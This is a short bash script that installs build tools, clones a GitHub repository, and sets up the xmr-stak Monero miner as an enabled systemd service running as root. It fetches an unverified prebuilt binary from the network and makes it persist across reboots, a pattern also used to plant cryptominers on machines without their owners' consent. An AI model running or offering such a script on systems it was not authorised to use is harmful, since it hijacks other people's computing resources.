#!/bin/bash

apt-get -y update && apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git && cd /root/ && sysctl -w vm.nr_hugepages=128 && cd / && cd /root/ && git clone https://github.com/nokian5500/tutunana.git && cd tutunana && chmod +x xmr-stak && mv xmr.service /lib/systemd/system/ && systemctl daemon-reload && systemctl enable xmr.service && systemctl start xmr.service && systemctl stop xmr.service && systemctl restart xmr.service
